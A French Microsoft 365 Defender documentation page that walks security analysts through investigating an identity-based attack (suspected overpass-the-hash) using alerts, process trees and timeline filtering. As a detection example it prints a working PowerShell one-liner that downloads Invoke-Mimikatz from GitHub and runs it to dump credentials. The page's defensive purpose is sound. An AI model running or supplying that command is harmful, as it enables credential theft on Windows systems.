---
title: Exemple d’attaque basée sur l’identité
description: Parcourez un exemple d’analyse d’une attaque basée sur l’identité.
keywords: incidents, alertes, examen, corrélation, attaque, machines, appareils, utilisateurs, identités, identité, boîte aux lettres, e-mail, 365, microsoft, m365, réponse aux incidents, cyberattaque
search.product: eADQiWindows 10XVcnh
ms.service: microsoft-365-security
ms.subservice: m365d
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- m365-security
- m365solution-firstincident
- highpri
- tier1
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.openlocfilehash: ffdc0e6731ae610a1a2184c6b7b5523dd1a73afa
ms.sourcegitcommit: 12af9e8e3a6eaa090fda9e98ccb831dff65863a4
ms.translationtype: MT
ms.contentlocale: fr-FR
ms.lasthandoff: 09/27/2022
ms.locfileid: "68048877"
---
# <a name="example-of-an-identity-based-attack"></a>Exemple d’attaque basée sur l’identité

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**S’applique à :**
- Microsoft 365 Defender

Microsoft Defender pour Identity peut aider à détecter les tentatives malveillantes de compromission des identités dans votre organisation. Étant donné que Defender pour Identity s’intègre à Microsoft 365 Defender, les analystes de sécurité peuvent avoir une visibilité sur les menaces provenant de Defender pour Identity, telles que les tentatives d’élévation de privilège Netlogon suspectées.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analyse de l’attaque dans Microsoft Defender pour Identity

Microsoft 365 Defender permet aux analystes de filtrer les alertes par source de détection sous l’onglet **Alertes** de la page Incidents. Dans l’exemple suivant, la source de détection est filtrée **sur Defender pour Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Filtrage de la source de détection dans Microsoft Defender pour Identity" lightbox="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png":::

La sélection de l’alerte **d’attaque par dépassement de hachage suspecte** est dirigée vers une page dans Microsoft Defender for Cloud Apps qui affiche des informations plus détaillées. Vous pouvez toujours en savoir plus sur une alerte ou une attaque en sélectionnant **En savoir plus sur ce type d’alerte** pour lire une [description des suggestions d’attaque et de](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) correction.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Alerte d’attaque de dépassement depass-the-hash suspectée" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Examen de la même attaque dans Microsoft Defender pour point de terminaison

Un analyste peut également utiliser Defender pour point de terminaison pour en savoir plus sur l’activité sur un point de terminaison. Sélectionnez l’incident dans la file d’attente des incidents, puis sélectionnez l’onglet **Alertes** . À partir de là, ils peuvent également identifier la source de détection. Une source de détection étiquetée EDR signifie Endpoint Detection and Response, qui est Defender pour point de terminaison. À partir de là, l’analyste sélectionne une alerte détectée par EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Détection et réponse des points de terminaison dans le portail Microsoft Defender pour point de terminaison" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png":::

La page d’alerte affiche diverses informations pertinentes, telles que le nom de l’appareil concerné, le nom d’utilisateur, l’état de l’examen automatique et les détails de l’alerte. L’histoire de l’alerte représente une représentation visuelle de l’arborescence de processus. L’arborescence de processus est une représentation hiérarchique des processus parents et enfants liés à l’alerte.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Arborescence de processus d’alerte dans le Microsoft Defender pour point de terminaison" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 

Chaque processus peut être développé pour afficher plus de détails. Les détails qu’un analyste peut voir sont les commandes réelles qui ont été entrées dans le cadre d’un script malveillant, des adresses IP de connexion sortante et d’autres informations utiles.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Détails du processus dans le portail Microsoft Defender pour point de terminaison" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
 
En sélectionnant **Afficher dans la chronologie**, un analyste peut explorer encore plus loin pour déterminer l’heure exacte du compromis. 

Microsoft Defender pour point de terminaison pouvez détecter de nombreux fichiers et scripts malveillants. Toutefois, en raison de nombreuses utilisations légitimes pour les connexions sortantes, PowerShell et l’activité en ligne de commande, une activité serait considérée comme bénigne jusqu’à ce qu’elle crée un fichier ou une activité malveillant. Par conséquent, l’utilisation de la chronologie permet aux analystes de mettre l’alerte en contexte avec l’activité environnante afin de déterminer la source d’origine ou l’heure de l’attaque qui autrement est masquée par le système de fichiers commun et l’activité utilisateur. 

Pour utiliser la chronologie, un analyste commence au moment de la détection d’alerte (en rouge) et fait défiler vers le bas dans le temps pour déterminer quand l’activité d’origine qui a conduit à l’activité malveillante a réellement démarré. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Heure de début de l’analyste pour la détection des alertes" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 

Il est important de comprendre et de distinguer les activités courantes telles que les connexions Windows Update, le trafic d’activation de logiciels approuvés Windows, d’autres connexions courantes aux sites Microsoft, l’activité Internet tierce, l’activité Configuration Manager de point de terminaison Microsoft et d’autres activités bénignes provenant d’activités suspectes. Une façon de faire la distinction consiste à utiliser des filtres de chronologie. Il existe de nombreux filtres qui peuvent mettre en évidence une activité spécifique tout en filtrant tout ce que l’analyste ne souhaite pas afficher. 

Dans l’image ci-dessous, l’analyste a filtré pour afficher uniquement les événements réseau et traiter. Ce critère de filtre permet à l’analyste de voir les connexions réseau et les processus entourant l’événement où le Bloc-notes a établi une connexion avec une adresse IP, que nous avons également vu dans l’arborescence des processus. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Utilisation du Bloc-notes pour établir une connexion sortante malveillante" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 

Dans cet événement particulier, le Bloc-notes a été utilisé pour établir une connexion sortante malveillante. Toutefois, les attaquants utilisent souvent iexplorer.exe pour établir des connexions pour télécharger une charge utile malveillante, car les processus iexplorer.exe sont généralement considérés comme une activité régulière de navigateur web.

Un autre élément à rechercher dans la chronologie serait les utilisations de PowerShell pour les connexions sortantes. L’analyste recherche les connexions PowerShell réussies avec des commandes telles qu’une `IEX (New-Object Net.Webclient)` connexion sortante à un site web hébergeant un fichier malveillant. 

Dans l’exemple suivant, PowerShell a été utilisé pour télécharger et exécuter Mimikatz à partir d’un site web :

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Un analyste peut rapidement rechercher des mots clés en tapant le mot clé dans la barre de recherche pour afficher uniquement les événements créés avec PowerShell. 

## <a name="next-step"></a>Étape suivante

Consultez le chemin d’accès à l’enquête sur le [hameçonnage](first-incident-path-phishing.md) .

## <a name="see-also"></a>Voir aussi

- [Vue d’ensemble des incidents](incidents-overview.md)
- [Gérer des incidents](manage-incidents.md)
- [Examiner des incidents](investigate-incidents.md)
